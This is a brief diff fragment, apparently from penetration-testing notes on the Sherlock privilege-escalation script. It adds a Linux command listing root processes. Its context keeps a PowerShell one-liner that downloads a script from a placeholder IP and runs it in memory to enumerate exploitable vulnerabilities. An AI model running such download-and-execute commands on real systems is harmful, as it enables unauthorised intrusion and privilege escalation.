@@ -353,3 +353,4 @@ Thanks for bringing Sherlock back!  :D
 
 I tend to do something like:  `iex ((new-object net.webclient).downloadstring("http://x.x.x.x/Sherlock.ps1")); Find-AllVulns`.  Saves having to mod the script.
 
+ps -ef | grep root # for all the root running processes on linux 
